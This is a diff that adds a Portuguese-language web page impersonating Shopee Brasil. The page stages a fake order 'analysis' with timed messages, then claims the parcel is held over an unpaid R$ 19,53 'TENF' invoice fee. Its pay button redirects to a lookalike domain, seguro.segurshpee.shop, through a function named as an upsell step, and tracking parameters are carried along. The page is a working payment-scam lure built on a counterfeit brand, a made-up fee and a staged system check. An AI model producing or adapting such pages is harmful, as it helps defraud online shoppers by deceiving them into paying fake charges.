@@ -1,0 +1,337 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Status do Pedido - Shopee</title>
+    
+    <script src="scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        /* Cabeçalho Branco */
+        .shopee-header {
+            background-color: #ffffff;
+            padding: 15px 20px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .shopee-header img {
+            height: 45px;
+        }
+
+        /* Container Central */
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        /* TELA DE ANÁLISE */
+        #tela-analise {
+            display: block;
+            padding: 40px 10px;
+        }
+
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ee4d2d;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .analise-titulo {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ee4d2d;
+            margin-bottom: 10px;
+        }
+
+        .analise-texto {
+            font-size: 15px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        /* TELA DE RESULTADO */
+        #tela-resultado {
+            display: none;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .alert-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #fff8e1;
+            color: #ee4d2d;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px auto;
+        }
+
+        .alert-icon svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        .order-details {
+            background-color: #fafafa;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+            border-left: 4px solid #ee4d2d;
+            border-top: 1px solid #eee;
+            border-right: 1px solid #eee;
+            border-bottom: 1px solid #eee;
+        }
+
+        .order-details p {
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .order-details p:last-child { margin-bottom: 0; }
+
+        .status-badge {
+            color: #ee4d2d;
+            font-weight: 700;
+            text-decoration: underline;
+        }
+
+        /* Box da TENF com a Imagem */
+        .tenf-box {
+            background-color: #f8f9fa;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            padding: 15px;
+            border: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            text-align: left;
+        }
+
+        .tenf-box img {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+        }
+
+        .tenf-box p {
+            font-size: 13px;
+            color: #444;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        .price {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ee4d2d;
+            margin-bottom: 20px;
+        }
+
+        .btn-pay {
+            display: block;
+            background: linear-gradient(181deg, rgb(245, 63, 45), rgb(254, 99, 50) 87%);
+            color: #ffffff;
+            text-decoration: none;
+            padding: 16px 20px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            width: 100%;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+            text-transform: uppercase;
+            box-shadow: 0 4px 6px rgba(238,77,45,0.3);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+
+    <script>
+        function setCookie(name, value, days) {
+            const d = new Date();
+            d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + d.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/";
+        }
+    
+        function getUTMParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const utms = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];
+            utms.forEach(utm => {
+                const value = urlParams.get(utm);
+                if (value) setCookie(utm, value, 7);
+            });
+        }
+        getUTMParams();
+    </script>
+</head>
+<body>
+
+    <header class="shopee-header">
+        <img src="images/bD02B7aWPrNxGHmjYYH88fXqzC2EcodYBuMaTb1X.png" alt="Shopee Logo">
+    </header>
+
+    <main class="container">
+        <div class="card">
+            
+            <div id="tela-analise">
+                <div class="spinner"></div>
+                <h2 class="analise-titulo">Analisando seu pedido...</h2>
+                <p id="texto-progresso" class="analise-texto">Conectando ao sistema logístico...</p>
+            </div>
+
+            <div id="tela-resultado">
+                
+                <div class="alert-icon">
+                    <svg fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                    </svg>
+                </div>
+
+                <h1 class="title">Atenção! Pedido Retido</h1>
+                <p class="subtitle">Identificamos uma pendência fiscal para a liberação do seu pacote.</p>
+
+                <div class="order-details">
+                    <p><strong>Número do pedido:</strong> 00044792</p>
+                    <p><strong>Status atual:</strong> <span class="status-badge">Aguardando pagamento da TENF</span></p>
+                </div>
+
+                <div class="tenf-box">
+                    <img src="images/8CFZmYIwZEXrX1D6b6f0Jws2jDbqbHsjxi9NZoi5.png" alt="Selo TENF">
+                    <p>Para emitirmos a <strong>Nota Fiscal (NF)</strong> e liberar a transportadora para entregar na sua residência, é necessário realizar o pagamento da Taxa de Emissão.</p>
+                </div>
+
+                <div class="price">R$ 19,53</div>
+
+                <a href="javascript:void(0)" class="btn-pay" onclick="redirectToNextUpsell()">
+                    Pagar Taxa e Liberar Envio
+                </a>
+            </div>
+
+        </div>
+
+        <div class="footer">
+            <p>Termos de Uso | Política de Privacidade</p>
+            <p style="margin-top: 5px;">© Shopee Brasil</p>
+        </div>
+    </main>
+
+    <script>
+        // Lógica de Animação de Análise
+        document.addEventListener("DOMContentLoaded", function() {
+            const textoProgresso = document.getElementById("texto-progresso");
+            const telaAnalise = document.getElementById("tela-analise");
+            const telaResultado = document.getElementById("tela-resultado");
+
+            setTimeout(() => {
+                textoProgresso.innerText = "Verificando dados de faturamento e emissão de Nota Fiscal...";
+            }, 1500);
+
+            setTimeout(() => {
+                textoProgresso.innerText = "Identificando pendências no pedido...";
+            }, 3000);
+
+            setTimeout(() => {
+                telaAnalise.style.display = "none";
+                telaResultado.style.display = "block";
+            }, 4500);
+        });
+
+        // Lógica de Redirecionamento
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return null;
+        }
+    
+        function redirectToNextUpsell() {
+            const utm_source = getCookie('utm_source');
+            const utm_medium = getCookie('utm_medium');
+            const utm_campaign = getCookie('utm_campaign');
+            const utm_term = getCookie('utm_term');
+            const utm_content = getCookie('utm_content');
+    
+            let nextUpsellUrl = 'https://seguro.segurshpee.shop/api/public/shopify?product=2628467963415&store=26284';
+    
+            const utmParams = [];
+            if (utm_source) utmParams.push(`utm_source=${utm_source}`);
+            if (utm_medium) utmParams.push(`utm_medium=${utm_medium}`);
+            if (utm_campaign) utmParams.push(`utm_campaign=${utm_campaign}`);
+            if (utm_term) utmParams.push(`utm_term=${utm_term}`);
+            if (utm_content) utmParams.push(`utm_content=${utm_content}`);
+    
+            if (utmParams.length > 0) {
+                nextUpsellUrl += '?' + utmParams.join('&');
+            }
+    
+            window.location.href = nextUpsellUrl;
+        }
+    </script>
+</body>
+</html>
